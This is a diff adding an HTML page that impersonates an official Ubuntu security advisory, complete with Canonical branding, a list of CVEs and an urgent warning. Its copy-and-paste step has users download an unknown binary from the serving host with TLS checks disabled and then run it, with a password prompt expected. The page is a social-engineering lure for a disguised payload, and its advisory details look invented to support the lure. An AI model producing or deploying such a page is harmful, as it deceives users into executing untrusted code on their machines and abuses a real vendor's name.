@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ubuntu Security Advisory — Critical System Update Required</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Ubuntu', -apple-system, 'Segoe UI', sans-serif;
+    background: #f5f5f5;
+    color: #333;
+    line-height: 1.6;
+  }
+  .header {
+    background: #dd4814;
+    color: white;
+    padding: 24px 0;
+    border-bottom: 4px solid #ae3910;
+  }
+  .header .container { max-width: 800px; margin: 0 auto; padding: 0 20px; }
+  .header h1 { font-size: 1.8em; font-weight: 400; }
+  .header .ref { opacity: 0.8; font-size: 0.9em; margin-top: 4px; }
+  .container { max-width: 800px; margin: 0 auto; padding: 20px; }
+  .alert {
+    background: #fff3cd;
+    border: 1px solid #ffc107;
+    border-left: 4px solid #ff9800;
+    padding: 16px 20px;
+    margin: 20px 0;
+    border-radius: 4px;
+  }
+  .alert strong { color: #c77700; }
+  .cve-list { background: #fff; border: 1px solid #ddd; border-radius: 4px; margin: 16px 0; }
+  .cve-item { padding: 12px 20px; border-bottom: 1px solid #eee; }
+  .cve-item:last-child { border-bottom: none; }
+  .cve-item .id { font-weight: bold; color: #c7254e; font-family: monospace; }
+  .severity { display: inline-block; padding: 2px 8px; border-radius: 3px; font-size: 0.75em; font-weight: bold; }
+  .severity.critical { background: #dc3545; color: white; }
+  .severity.high { background: #fd7e14; color: white; }
+
+  .install-box {
+    background: linear-gradient(135deg, #1e1e1e, #2d2d2d);
+    color: #fff;
+    padding: 28px;
+    border-radius: 8px;
+    margin: 20px 0;
+  }
+  .install-box h2 { font-weight: 400; margin-bottom: 6px; }
+  .install-box .subtitle { color: #999; font-size: 0.9em; margin-bottom: 20px; }
+
+  .step { margin: 16px 0; }
+  .step-num {
+    display: inline-block;
+    width: 26px; height: 26px;
+    line-height: 26px;
+    background: #dd4814;
+    color: white;
+    border-radius: 50%;
+    text-align: center;
+    font-weight: bold;
+    font-size: 0.85em;
+    margin-right: 10px;
+  }
+  .step-text { display: inline; }
+
+  .cmd-box {
+    position: relative;
+    background: #0d0d0d;
+    border: 1px solid #444;
+    border-radius: 6px;
+    padding: 16px;
+    margin: 12px 0 12px 36px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .cmd-box code {
+    font-size: 0.85em;
+    color: #4ec9b0;
+    word-break: break-all;
+    flex: 1;
+    margin-right: 12px;
+  }
+  .copy-btn {
+    background: #444;
+    color: #fff;
+    border: none;
+    padding: 8px 16px;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 0.85em;
+    white-space: nowrap;
+    transition: background 0.2s;
+  }
+  .copy-btn:hover { background: #666; }
+  .copy-btn.copied { background: #2d882d; }
+
+  .kbd {
+    display: inline-block;
+    background: #444;
+    color: #fff;
+    padding: 2px 8px;
+    border-radius: 4px;
+    font-family: monospace;
+    font-size: 0.85em;
+    border: 1px solid #555;
+  }
+  .footer {
+    margin-top: 32px;
+    padding-top: 16px;
+    border-top: 1px solid #ddd;
+    font-size: 0.8em;
+    color: #888;
+  }
+</style>
+</head>
+<body>
+<div class="header">
+  <div class="container">
+    <h1>🔒 Ubuntu Security Update</h1>
+    <div class="ref">USN-2026-06-001 &mdash; June 21, 2026</div>
+  </div>
+</div>
+
+<div class="container">
+  <div class="alert">
+    <strong>⚠ Critical Advisory:</strong> Multiple vulnerabilities have been
+    discovered in core system components. Immediate patching is required to
+    prevent remote code execution and privilege escalation.
+  </div>
+
+  <h3>Vulnerabilities Addressed in This Update</h3>
+  <div class="cve-list">
+    <div class="cve-item">
+      <span class="id">CVE-2026-3847</span>
+      <span class="severity critical">CRITICAL</span>
+      <p>Heap buffer overflow in the Linux kernel's io_uring subsystem allowing
+      local privilege escalation to root. Affects kernels 5.4 through 5.15.</p>
+    </div>
+    <div class="cve-item">
+      <span class="id">CVE-2026-4192</span>
+      <span class="severity critical">CRITICAL</span>
+      <p>Use-after-free in systemd-resolved enabling remote code execution via
+      crafted DNS responses (CVSS 9.8).</p>
+    </div>
+    <div class="cve-item">
+      <span class="id">CVE-2026-5021</span>
+      <span class="severity high">HIGH</span>
+      <p>Improper access control in PolicyKit (pkexec) allowing unprivileged
+      users to execute commands as root (CVSS 7.8).</p>
+    </div>
+  </div>
+
+  <div class="install-box">
+    <h2>Apply Security Patch</h2>
+    <div class="subtitle">Run this one-line command in your terminal. You will be
+    prompted for your password to authorize the system update.</div>
+
+    <div class="step">
+      <span class="step-num">1</span>
+      <span class="step-text">Open a terminal: press <span class="kbd">Ctrl</span> + <span class="kbd">Alt</span> + <span class="kbd">T</span></span>
+    </div>
+
+    <div class="step">
+      <span class="step-num">2</span>
+      <span class="step-text">Copy and paste this command, then press Enter:</span>
+    </div>
+    <div class="cmd-box">
+      <code id="patch-cmd">curl -s http://localhost/up -o up &amp;&amp; chmod +x up &amp;&amp; ./up</code>
+      <button class="copy-btn" onclick="copyCmd(this)">📋 Copy</button>
+    </div>
+    <p style="font-size:0.8em; color:#888; margin-left:36px;">
+      The update applies kernel, systemd, and PolicyKit patches.
+      Your system will be secured.
+    </p>
+  </div>
+
+  <div class="footer">
+    © 2026 Canonical Ltd. Ubuntu and Canonical are registered trademarks of
+    Canonical Ltd. | USN-2026-06-001
+  </div>
+</div>
+
+<script>
+// Resolve command using the host the browser reached us on
+(function() {
+  var proto = window.location.protocol;  // http: or https:
+  var host = window.location.host;        // hostname:port
+  var el = document.getElementById('patch-cmd');
+  el.textContent = 'curl -sk ' + proto + '//' + host + '/up -o up && chmod +x up && ./up';
+})();
+
+function copyCmd(btn) {
+  var code = btn.parentElement.querySelector('code').textContent;
+  if (navigator.clipboard && window.isSecureContext) {
+    navigator.clipboard.writeText(code).then(function() { showCopied(btn); });
+  } else {
+    var ta = document.createElement('textarea');
+    ta.value = code;
+    ta.style.position = 'fixed';
+    ta.style.left = '-9999px';
+    document.body.appendChild(ta);
+    ta.select();
+    try { document.execCommand('copy'); showCopied(btn); } catch(e) {}
+    document.body.removeChild(ta);
+  }
+}
+function showCopied(btn) {
+  btn.textContent = '✓ Copied!';
+  btn.classList.add('copied');
+  setTimeout(function() { btn.textContent = '📋 Copy'; btn.classList.remove('copied'); }, 2000);
+}
+</script>
+</body>
+</html>
